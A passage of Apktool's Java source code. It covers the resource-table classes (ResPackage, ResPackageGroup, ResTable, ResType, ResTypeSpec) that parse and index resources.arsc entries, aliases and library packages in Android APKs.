    }

    private ResEntrySpec[] resolveEntries(ResId[] entries) {
        if (entries == null || entries.length == 0) {
            return null;
        }

        ResEntrySpec[] entrySpecs = new ResEntrySpec[entries.length];
        int entrySpecsCount = 0;

        for (int i = 0; i < entries.length; i++) {
            ResId resId = entries[i];
            if (resId == ResId.NULL) {
                continue;
            }

            ResEntrySpec entrySpec;
            try {
                entrySpec = mPackage.getEntrySpec(resId.typeId(), resId.entryId());
            } catch (UndefinedResObjectException ignored) {
                Log.w(TAG, "Unresolved overlayable entry ID: " + resId);
                continue;
            }

            entrySpecs[entrySpecsCount++] = entrySpec;
        }

        if (entrySpecsCount < entrySpecs.length) {
            entrySpecs = Arrays.copyOf(entrySpecs, entrySpecsCount);
        }

        return entrySpecs;
    }

    @Override
    public String toString() {
        return String.format("ResOverlayable{pkg=%s, name=%s, actor=%s}", mPackage, mName, mActor);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResOverlayable) {
            ResOverlayable other = (ResOverlayable) obj;
            return mPackage.equals(other.mPackage)
                && mName.equals(other.mName)
                && mActor.equals(other.mActor);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mPackage, mName, mActor);
    }

    private static class Policy {
        private final int mFlags;
        private final ResId[] mEntries;

        public Policy(int flags, ResId[] entries) {
            mFlags = flags;
            mEntries = entries;
        }

        public int getFlags() {
            return mFlags;
        }

        public ResId[] getEntries() {
            return mEntries;
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResPackage.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.UndefinedResObjectException;
import brut.androlib.res.table.value.ResValue;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Objects;
import java.util.Set;

public class ResPackage {
    private final ResPackageGroup mGroup;
    private final int mIndex;
    private final Map<Integer, ResTypeSpec> mTypeSpecs;
    private final Map<Pair<Integer, ResConfig>, ResType> mTypes;
    private final Map<ResId, ResEntrySpec> mEntrySpecs;
    private final Map<Pair<ResId, ResConfig>, ResEntry> mEntries;
    private final Map<String, ResOverlayable> mOverlayables;
    private final Map<ResId, ResId> mAliases;
    private final Set<String> mNameRegistry;

    public ResPackage(ResPackageGroup group, int index) {
        assert group != null && index >= 0;
        mGroup = group;
        mIndex = index;
        mTypeSpecs = new HashMap<>();
        mTypes = new HashMap<>();
        mEntrySpecs = new HashMap<>();
        mEntries = new HashMap<>();
        mOverlayables = new HashMap<>();
        mAliases = new HashMap<>();
        mNameRegistry = new HashSet<>();
    }

    public ResTable getTable() {
        return mGroup.getTable();
    }

    public ResPackageGroup getGroup() {
        return mGroup;
    }

    public int getId() {
        return mGroup.getId();
    }

    public String getName() {
        return mGroup.getName();
    }

    public int getIndex() {
        return mIndex;
    }

    public boolean hasTypeSpec(int typeId) {
        return mTypeSpecs.containsKey(typeId);
    }

    public ResTypeSpec getTypeSpec(int typeId) throws UndefinedResObjectException {
        ResTypeSpec typeSpec = mTypeSpecs.get(typeId);
        if (typeSpec == null) {
            throw new UndefinedResObjectException(
                String.format("type spec: pkgId=0x%02x, typeId=0x%02x", getId(), typeId));
        }
        return typeSpec;
    }

    public ResTypeSpec addTypeSpec(int typeId, String typeName) throws AndrolibException {
        ResTypeSpec typeSpec = mTypeSpecs.get(typeId);
        if (typeSpec != null) {
            throw new AndrolibException(
                String.format("Repeated type spec: pkgId=0x%02x, typeId=0x%02x, typeName=%s",
                    getId(), typeId, typeName));
        }

        typeSpec = new ResTypeSpec(this, typeId, typeName);
        mTypeSpecs.put(typeId, typeSpec);
        return typeSpec;
    }

    public int getTypeSpecCount() {
        return mTypeSpecs.size();
    }

    public Collection<ResTypeSpec> listTypeSpecs() {
        return mTypeSpecs.values();
    }

    public boolean hasType(int typeId) {
        return hasType(typeId, ResConfig.DEFAULT);
    }

    public boolean hasType(int typeId, ResConfig config) {
        Pair<Integer, ResConfig> typeKey = Pair.of(typeId, config);
        return mTypes.containsKey(typeKey);
    }

    public ResType getType(int typeId) throws UndefinedResObjectException {
        return getType(typeId, ResConfig.DEFAULT);
    }

    public ResType getType(int typeId, ResConfig config) throws UndefinedResObjectException {
        Pair<Integer, ResConfig> typeKey = Pair.of(typeId, config);
        ResType type = mTypes.get(typeKey);
        if (type == null) {
            throw new UndefinedResObjectException(
                String.format("type: pkgId=0x%02x, typeId=0x%02x, config=%s", getId(), typeId, config));
        }
        return type;
    }

    public ResType addType(int typeId) throws UndefinedResObjectException {
        return addType(typeId, ResConfig.DEFAULT);
    }

    public ResType addType(int typeId, ResConfig config) throws UndefinedResObjectException {
        Pair<Integer, ResConfig> typeKey = Pair.of(typeId, config);
        ResType type = mTypes.get(typeKey);
        if (type != null) {
            // We can safely skip adding existing types.
            return type;
        }

        ResTypeSpec typeSpec = getTypeSpec(typeId);
        type = new ResType(typeSpec, config);
        mTypes.put(typeKey, type);
        return type;
    }

    public int getTypeCount() {
        return mTypes.size();
    }

    public Collection<ResType> listTypes() {
        return mTypes.values();
    }

    public boolean hasEntrySpec(int typeId, int entryId) {
        ResId resId = ResId.of(getId(), typeId, entryId);
        resId = mAliases.getOrDefault(resId, resId);

        return mEntrySpecs.containsKey(resId);
    }

    public ResEntrySpec getEntrySpec(int typeId, int entryId) throws UndefinedResObjectException {
        ResId resId = ResId.of(getId(), typeId, entryId);
        if (mAliases.containsKey(resId)) {
            resId = mAliases.get(resId);
            typeId = resId.typeId();
            entryId = resId.entryId();
        }

        ResEntrySpec entrySpec = mEntrySpecs.get(resId);
        if (entrySpec == null) {
            throw new UndefinedResObjectException(
                String.format("entry spec: pkgId=0x%02x, typeId=0x%02x, entryId=0x%04x", getId(), typeId, entryId));
        }
        return entrySpec;
    }

    public ResEntrySpec addEntrySpec(int typeId, int entryId, String name) throws AndrolibException {
        ResId resId = ResId.of(getId(), typeId, entryId);
        if (mAliases.containsKey(resId)) {
            resId = mAliases.get(resId);
            typeId = resId.typeId();
            entryId = resId.entryId();
        }

        ResEntrySpec entrySpec = mEntrySpecs.get(resId);
        if (entrySpec != null) {
            throw new AndrolibException(
                String.format("Repeated entry spec: pkgId=0x%02x, typeId=0x%02x, entryId=0x%04x",
                    getId(), typeId, entryId));
        }

        ResTypeSpec typeSpec = getTypeSpec(typeId);

        // Some apps had their entry names obfuscated or collapsed to a single value in the key string pool.
        // Enforce uniqueness by forcing a rename when that happens.
        if (mNameRegistry.contains(typeSpec.getName() + "/" + name)) {
            name = "";
        }

        entrySpec = new ResEntrySpec(typeSpec, entryId, name);
        mEntrySpecs.put(resId, entrySpec);

        // Register the name to enforce uniqueness.
        mNameRegistry.add(typeSpec.getName() + "/" + entrySpec.getName());

        return entrySpec;
    }

    public int getEntrySpecCount() {
        return mEntrySpecs.size();
    }

    public Collection<ResEntrySpec> listEntrySpecs() {
        return mEntrySpecs.values();
    }

    public boolean hasEntry(int typeId, int entryId) {
        return hasEntry(typeId, entryId, ResConfig.DEFAULT);
    }

    public boolean hasEntry(int typeId, int entryId, ResConfig config) {
        ResId resId = ResId.of(getId(), typeId, entryId);
        resId = mAliases.getOrDefault(resId, resId);

        Pair<ResId, ResConfig> entryKey = Pair.of(resId, config);
        return mEntries.containsKey(entryKey);
    }

    public ResEntry getEntry(int typeId, int entryId) throws UndefinedResObjectException {
        return getEntry(typeId, entryId, ResConfig.DEFAULT);
    }

    public ResEntry getEntry(int typeId, int entryId, ResConfig config) throws UndefinedResObjectException {
        ResId resId = ResId.of(getId(), typeId, entryId);
        if (mAliases.containsKey(resId)) {
            resId = mAliases.get(resId);
            typeId = resId.typeId();
            entryId = resId.entryId();
        }

        Pair<ResId, ResConfig> entryKey = Pair.of(resId, config);
        ResEntry entry = mEntries.get(entryKey);
        if (entry == null) {
            throw new UndefinedResObjectException(
                String.format("entry: pkgId=0x%02x, typeId=0x%02x, entryId=0x%04x, config=%s",
                    getId(), typeId, entryId, config));
        }
        return entry;
    }

    public ResEntry addEntry(int typeId, int entryId, ResValue value) throws AndrolibException {
        return addEntry(typeId, entryId, ResConfig.DEFAULT, value);
    }

    public ResEntry addEntry(int typeId, int entryId, ResConfig config, ResValue value) throws AndrolibException {
        ResId resId = ResId.of(getId(), typeId, entryId);
        if (mAliases.containsKey(resId)) {
            resId = mAliases.get(resId);
            typeId = resId.typeId();
            entryId = resId.entryId();
        }

        Pair<ResId, ResConfig> entryKey = Pair.of(resId, config);
        ResEntry entry = mEntries.get(entryKey);
        if (entry != null) {
            throw new AndrolibException(
                String.format("Repeated entry: pkgId=0x%02x, typeId=0x%02x, entryId=0x%04x, config=%s",
                    getId(), typeId, entryId, config));
        }

        ResEntrySpec entrySpec = getEntrySpec(typeId, entryId);
        Pair<Integer, ResConfig> typeKey = Pair.of(typeId, config);
        ResType type = mTypes.get(typeKey);
        if (type == null) {
            // We can safely create the type if it's missing.
            ResTypeSpec typeSpec = getTypeSpec(typeId);
            type = new ResType(typeSpec, config);
            mTypes.put(typeKey, type);
        }

        entry = new ResEntry(type, entrySpec, value);
        mEntries.put(entryKey, entry);
        return entry;
    }

    public int getEntryCount() {
        return mEntries.size();
    }

    public Collection<ResEntry> listEntries() {
        return mEntries.values();
    }

    public boolean hasOverlayable(String name) {
        return mOverlayables.containsKey(name);
    }

    public ResOverlayable getOverlayable(String name) throws UndefinedResObjectException {
        ResOverlayable overlayable = mOverlayables.get(name);
        if (overlayable == null) {
            throw new UndefinedResObjectException(
                String.format("overlayable: pkgId=0x%02x, name=%s", getId(), name));
        }
        return overlayable;
    }

    public ResOverlayable addOverlayable(String name, String actor) throws AndrolibException {
        ResOverlayable overlayable = mOverlayables.get(name);
        if (overlayable != null) {
            throw new AndrolibException(
                String.format("Repeated overlayable: pkgId=0x%02x, name=%s", getId(), name));
        }

        overlayable = new ResOverlayable(this, name, actor);
        mOverlayables.put(name, overlayable);
        return overlayable;
    }

    public int getOverlayableCount() {
        return mOverlayables.size();
    }

    public Collection<ResOverlayable> listOverlayables() {
        return mOverlayables.values();
    }

    public boolean isAlias(ResId resId) {
        return mAliases.containsKey(resId);
    }

    public ResId resolveAlias(ResId aliasId) throws UndefinedResObjectException {
        ResId resId = mAliases.get(aliasId);
        if (resId == null) {
            throw new UndefinedResObjectException(
                String.format("alias: pkgId=0x%02x, aliasId=%s", getId(), aliasId));
        }
        return resId;
    }

    public void addAlias(ResId aliasId, ResId finalId) throws AndrolibException {
        if (mAliases.containsKey(aliasId)) {
            throw new AndrolibException(
                String.format("Repeated alias: pkgId=0x%02x, aliasId=%s", getId(), aliasId));
        }

        mAliases.put(aliasId, finalId);
    }

    public int getAliasCount() {
        return mAliases.size();
    }

    public Map<ResId, ResId> getAliases() {
        return mAliases;
    }

    @Override
    public String toString() {
        return String.format("ResPackage{id=0x%02x, name=%s}", getId(), getName());
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResPackage) {
            ResPackage other = (ResPackage) obj;
            return mGroup.equals(other.mGroup)
                && mIndex == other.mIndex;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mGroup, mIndex);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResPackageGroup.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import brut.androlib.exceptions.UndefinedResObjectException;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.NoSuchElementException;
import java.util.Objects;

public class ResPackageGroup {
    private final ResTable mTable;
    private final int mId;
    private final String mName;
    private final List<ResPackage> mPackages;

    public ResPackageGroup(ResTable table, int id, String name) {
        assert table != null && id >= 0 && name != null;
        mTable = table;
        mId = id;
        mName = name;
        mPackages = new ArrayList<>();
        mPackages.add(new ResPackage(this, 0));
    }

    public ResTable getTable() {
        return mTable;
    }

    public int getId() {
        return mId;
    }

    public String getName() {
        return mName;
    }

    public int getPackageCount() {
        return mPackages.size();
    }

    public Collection<ResPackage> listPackages() {
        return mPackages;
    }

    public ResPackage getBasePackage() {
        return mPackages.get(0);
    }

    public Collection<ResPackage> listSubPackages() {
        return mPackages.subList(1, mPackages.size());
    }

    public ResPackage addSubPackage() {
        ResPackage pkg = new ResPackage(this, mPackages.size());
        mPackages.add(pkg);
        return pkg;
    }

    public boolean hasTypeSpec(int typeId) {
        for (ResPackage pkg : mPackages) {
            if (pkg.hasTypeSpec(typeId)) {
                return true;
            }
        }
        return false;
    }

    public ResTypeSpec getTypeSpec(int typeId) throws UndefinedResObjectException {
        for (ResPackage pkg : mPackages) {
            try {
                return pkg.getTypeSpec(typeId);
            } catch (UndefinedResObjectException ignored) {
            }
        }
        throw new UndefinedResObjectException(
            String.format("type spec: pkgId=0x%02x, typeId=0x%02x", mId, typeId));
    }

    public boolean hasType(int typeId) {
        return hasType(typeId, ResConfig.DEFAULT);
    }

    public boolean hasType(int typeId, ResConfig config) {
        for (ResPackage pkg : mPackages) {
            if (pkg.hasType(typeId, config)) {
                return true;
            }
        }
        return false;
    }

    public ResType getType(int typeId) throws UndefinedResObjectException {
        return getType(typeId, ResConfig.DEFAULT);
    }

    public ResType getType(int typeId, ResConfig config) throws UndefinedResObjectException {
        for (ResPackage pkg : mPackages) {
            try {
                return pkg.getType(typeId, config);
            } catch (UndefinedResObjectException ignored) {
            }
        }
        throw new UndefinedResObjectException(
            String.format("type: pkgId=0x%02x, typeId=0x%02x, config=%s", mId, typeId, config));
    }

    public boolean hasEntrySpec(int typeId, int entryId) {
        for (ResPackage pkg : mPackages) {
            if (pkg.hasEntrySpec(typeId, entryId)) {
                return true;
            }
        }
        return false;
    }

    public ResEntrySpec getEntrySpec(int typeId, int entryId) throws UndefinedResObjectException {
        for (ResPackage pkg : mPackages) {
            try {
                return pkg.getEntrySpec(typeId, entryId);
            } catch (UndefinedResObjectException ignored) {
            }
        }
        throw new UndefinedResObjectException(
            String.format("entry spec: pkgId=0x%02x, typeId=0x%02x, entryId=0x%04x", mId, typeId, entryId));
    }

    public Iterable<ResEntrySpec> listEntrySpecs() {
        return () -> new Iterator<ResEntrySpec>() {
            private Iterator<ResEntrySpec> current = Collections.emptyIterator();
            private int index = 0;

            @Override
            public boolean hasNext() {
                while (!current.hasNext() && index < mPackages.size()) {
                    current = mPackages.get(index++).listEntrySpecs().iterator();
                }
                return current.hasNext();
            }

            @Override
            public ResEntrySpec next() {
                if (!hasNext()) {
                    throw new NoSuchElementException();
                }
                return current.next();
            }
        };
    }

    public boolean hasEntry(int typeId, int entryId) {
        return hasEntry(typeId, entryId, ResConfig.DEFAULT);
    }

    public boolean hasEntry(int typeId, int entryId, ResConfig config) {
        for (ResPackage pkg : mPackages) {
            if (pkg.hasEntry(typeId, entryId, config)) {
                return true;
            }
        }
        return false;
    }

    public ResEntry getEntry(int typeId, int entryId) throws UndefinedResObjectException {
        return getEntry(typeId, entryId, ResConfig.DEFAULT);
    }

    public ResEntry getEntry(int typeId, int entryId, ResConfig config) throws UndefinedResObjectException {
        for (ResPackage pkg : mPackages) {
            try {
                return pkg.getEntry(typeId, entryId, config);
            } catch (UndefinedResObjectException ignored) {
            }
        }
        throw new UndefinedResObjectException(
            String.format("entry: pkgId=0x%02x, typeId=0x%02x, entryId=0x%04x, config=%s",
                mId, typeId, entryId, config));
    }

    public Iterable<ResEntry> listEntries() {
        return () -> new Iterator<ResEntry>() {
            private Iterator<ResEntry> current = Collections.emptyIterator();
            private int index = 0;

            @Override
            public boolean hasNext() {
                while (!current.hasNext() && index < mPackages.size()) {
                    current = mPackages.get(index++).listEntries().iterator();
                }
                return current.hasNext();
            }

            @Override
            public ResEntry next() {
                if (!hasNext()) {
                    throw new NoSuchElementException();
                }
                return current.next();
            }
        };
    }

    @Override
    public String toString() {
        return String.format("ResPackageGroup{id=0x%02x, name=%s}", mId, mName);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResPackageGroup) {
            ResPackageGroup other = (ResPackageGroup) obj;
            return mId == other.mId
                && mName.equals(other.mName);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mId, mName);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResTable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import brut.androlib.Config;
import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.UndefinedResObjectException;
import brut.androlib.meta.ApkInfo;
import brut.androlib.res.Framework;
import brut.androlib.res.decoder.BinaryResourceParser;
import brut.common.Log;
import brut.directory.DirectoryException;
import brut.directory.ExtFile;
import brut.directory.ZipRODirectory;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class ResTable {
    private static final String TAG = ResTable.class.getName();

    public static final int SYS_PACKAGE_ID = 0x01;
    public static final int APP_PACKAGE_ID = 0x7F;

    private final ApkInfo mApkInfo;
    private final Config mConfig;
    private final Map<Integer, ResPackageGroup> mPackageGroups;
    private final List<Integer> mLibPackageIds;
    private final List<Integer> mFramePackageIds;
    private final Map<Integer, String> mDynamicRefTable;
    private int mNextPackageId;
    private ResPackage mMainPackage;

    public ResTable(ApkInfo apkInfo, Config config) {
        assert apkInfo != null && config != null;
        mApkInfo = apkInfo;
        mConfig = config;
        mPackageGroups = new LinkedHashMap<>();
        mLibPackageIds = new ArrayList<>();
        mFramePackageIds = new ArrayList<>();
        mDynamicRefTable = new LinkedHashMap<>();
        mNextPackageId = SYS_PACKAGE_ID + 1;
    }

    public ApkInfo getApkInfo() {
        return mApkInfo;
    }

    public Config getConfig() {
        return mConfig;
    }

    public ResPackage getMainPackage() {
        return mMainPackage;
    }

    public Collection<Integer> getLibPackageIds() {
        return mLibPackageIds;
    }

    public Collection<Integer> getFramePackageIds() {
        return mFramePackageIds;
    }

    public void load() throws AndrolibException {
        if (mMainPackage != null) {
            return;
        }

        Log.i(TAG, "Loading resource table...");
        ExtFile apkFile = mApkInfo.getApkFile();

        ZipRODirectory zipDir;
        try {
            zipDir = (ZipRODirectory) apkFile.getDirectory();
        } catch (DirectoryException ex) {
            throw new AndrolibException("Could not open apk file: " + apkFile, ex);
        }

        loadPackagesFromApk(apkFile, zipDir, true);

        ResPackageGroup pkgGroup;
        if (mPackageGroups.isEmpty()) {
            // Empty resources.arsc, create a dummy package group.
            pkgGroup = new ResPackageGroup(this, 0, "");
            mPackageGroups.put(0, pkgGroup);
        } else if (mPackageGroups.containsKey(APP_PACKAGE_ID)) {
            // Prefer the standard app package group.
            pkgGroup = mPackageGroups.get(APP_PACKAGE_ID);
        } else {
            // Fall back to the first package group in the table.
            pkgGroup = mPackageGroups.values().iterator().next();
        }

        mMainPackage = pkgGroup.getBasePackage();
    }

    private void loadPackagesFromApk(File apkFile, ZipRODirectory zipDir, boolean isMainPackage)
            throws AndrolibException {
        try {
            if (!zipDir.containsFile("resources.arsc")) {
                throw new AndrolibException("Could not find resources.arsc in file: " + apkFile);
            }

            try (InputStream in = zipDir.getFileInput("resources.arsc")) {
                BinaryResourceParser parser = isMainPackage
                    ? new BinaryResourceParser(this, mConfig.isKeepBrokenResources(), mConfig.isDecodeResolveGreedy())
                    : new BinaryResourceParser(this, true, true);
                parser.parse(in);

                // Only flag the app for the main package.
                if (isMainPackage) {
                    if (parser.isSparseEntries()) {
                        mApkInfo.getResourcesInfo().setSparseEntries(true);
                    }
                    if (parser.isCompactEntries()) {
                        mApkInfo.getResourcesInfo().setCompactEntries(true);
                    }
                }
            }
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException("Could not load resources.arsc from file: " + apkFile, ex);
        }
    }

    public boolean hasPackageGroup(int id) {
        return mPackageGroups.containsKey(id);
    }

    public ResPackageGroup getPackageGroup(int id) throws UndefinedResObjectException {
        ResPackageGroup pkgGroup = mPackageGroups.get(id);
        if (pkgGroup == null) {
            throw new UndefinedResObjectException(String.format("package group: id=0x%02x", id));
        }
        return pkgGroup;
    }

    public ResPackageGroup addPackageGroup(int id, String name) throws AndrolibException {
        ResPackageGroup pkgGroup = mPackageGroups.get(id);
        if (pkgGroup != null) {
            throw new AndrolibException(String.format("Repeated package group: id=0x%02x, name=%s", id, name));
        }

        // If the package ID is 0x00 and the main package is loaded, that means that a shared library is being loaded,
        // so we change it to the reference package ID defined in the dynamic reference table, or assign it the next
        // available ID.
        if (id == 0 && mMainPackage != null) {
            id = getDynamicRefPackageId(name);
            if (id == 0) {
                id = mNextPackageId++;
            }
        }

        pkgGroup = new ResPackageGroup(this, id, name);
        mPackageGroups.put(id, pkgGroup);
        return pkgGroup;
    }

    public int getPackageGroupCount() {
        return mPackageGroups.size();
    }

    public Collection<ResPackageGroup> listPackageGroups() {
        return mPackageGroups.values();
    }

    public ResPackageGroup resolvePackageGroup(int id) throws AndrolibException {
        ResPackageGroup pkgGroup = mPackageGroups.get(id);
        if (pkgGroup == null) {
            pkgGroup = loadLibraryById(id);
            if (pkgGroup == null) {
                pkgGroup = loadFrameworkById(id);
            }
        }
        return pkgGroup;
    }

    private ResPackageGroup loadLibraryById(int id) throws AndrolibException {
        String name = mDynamicRefTable.get(id);
        String[] libFiles = mConfig.getLibraryFiles();
        if (name == null || libFiles == null) {
            return null;
        }

        File apkFile = null;
        for (String libEntry : libFiles) {
            String[] parts = libEntry.split(":", 2);
            if (parts.length == 2 && name.equals(parts[0])) {
                apkFile = new File(parts[1]);
                break;
            }
        }
        if (apkFile == null) {
            return null;
        }

        loadPackagesFromApk(apkFile);

        ResPackageGroup pkgGroup = mPackageGroups.get(id);
        if (pkgGroup == null) {
            throw new AndrolibException(String.format("Library package not found: id=0x%02x", id));
        }

        mLibPackageIds.add(id);
        return pkgGroup;
    }

    private ResPackageGroup loadFrameworkById(int id) throws AndrolibException {
        File apkFile = new Framework(mConfig).getApkFile(id);
        loadPackagesFromApk(apkFile);

        ResPackageGroup pkgGroup = mPackageGroups.get(id);
        if (pkgGroup == null) {
            throw new AndrolibException(String.format("Framework package not found: id=0x%02x", id));
        }

        mFramePackageIds.add(id);
        return pkgGroup;
    }

    private void loadPackagesFromApk(File apkFile) throws AndrolibException {
        Log.i(TAG, "Loading resource table from file: " + apkFile);

        try (ZipRODirectory zipDir = new ZipRODirectory(apkFile)) {
            loadPackagesFromApk(apkFile, zipDir, false);
        } catch (DirectoryException ex) {
            throw new AndrolibException("Could not open apk file: " + apkFile, ex);
        }
    }

    public ResEntrySpec resolve(ResId resId) throws AndrolibException {
        return resolvePackageGroup(resId.pkgId()).getEntrySpec(resId.typeId(), resId.entryId());
    }

    public ResEntry resolveEntry(ResId resId) throws AndrolibException {
        return resolvePackageGroup(resId.pkgId()).getEntry(resId.typeId(), resId.entryId());
    }

    public String getDynamicRefPackageName(int id) {
        String name = mDynamicRefTable.get(id);
        if (name == null) {
            Log.w(TAG, "Dynamic ref package name not defined for package ID: 0x02x", id);
        }
        return name;
    }

    public int getDynamicRefPackageId(String name) {
        for (Map.Entry<Integer, String> entry : mDynamicRefTable.entrySet()) {
            if (name.equals(entry.getValue())) {
                return entry.getKey();
            }
        }
        Log.w(TAG, "Dynamic ref package ID not defined for package: " + name);
        return 0;
    }

    public void addDynamicRefPackage(int id, String name) {
        // Ensure the package ID isn't already mapped to a different name.
        String existing = mDynamicRefTable.get(id);
        if (existing != null) {
            if (!existing.equals(name)) {
                Log.w(TAG, "Repeated dynamic ref package ID: %s (assigned to name: %s)", id, existing);
                return;
            }
            // Identical mappings are normal.
            return;
        }

        // Ensure the package name isn't already mapped to a different ID.
        for (Map.Entry<Integer, String> entry : mDynamicRefTable.entrySet()) {
            if (name.equals(entry.getValue())) {
                Log.w(TAG, "Repeated dynamic ref package name: %s (assigned to ID: %s)", name, entry.getKey());
                return;
            }
        }

        mDynamicRefTable.put(id, name);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResType.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import java.util.Objects;

public class ResType {
    private final ResTypeSpec mSpec;
    private final ResConfig mConfig;

    public ResType(ResTypeSpec spec, ResConfig config) {
        assert spec != null && config != null;
        mSpec = spec;
        mConfig = config;
    }

    public ResPackage getPackage() {
        return mSpec.getPackage();
    }

    public ResTypeSpec getSpec() {
        return mSpec;
    }

    public int getId() {
        return mSpec.getId();
    }

    public String getName() {
        return mSpec.getName();
    }

    public boolean isBagType() {
        return mSpec.isBagType();
    }

    public ResConfig getConfig() {
        return mConfig;
    }

    @Override
    public String toString() {
        return String.format("ResType{spec=%s, config=%s}", mSpec, mConfig);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResType) {
            ResType other = (ResType) obj;
            return mSpec.equals(other.mSpec)
                && mConfig.equals(other.mConfig);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mSpec, mConfig);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResTypeSpec.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import java.util.Objects;

public class ResTypeSpec {
    private final ResPackage mPackage;
    private final int mId;
    private final String mName;

    public ResTypeSpec(ResPackage pkg, int id, String name) {
        assert pkg != null && id > 0 && name != null;
        mPackage = pkg;
        mId = id;
        mName = name;
    }

    public ResPackage getPackage() {
        return mPackage;
    }

    public int getId() {
        return mId;
    }

    public String getName() {
        return mName;
    }

    public boolean isBagType() {
        switch (mName) {
            case "attr":
            case "^attr-private":
            case "array":
            case "plurals":
            case "style":
                return true;
            default:
                return false;
        }
    }

    @Override
    public String toString() {
        return String.format("ResTypeSpec{pkg=%s, id=0x%02x, name=%s}", mPackage, mId, mName);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResTypeSpec) {
            ResTypeSpec other = (ResTypeSpec) obj;
            return mPackage.equals(other.mPackage)
                && mId == other.mId
                && mName.equals(other.mName);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mPackage, mId, mName);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResArray.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
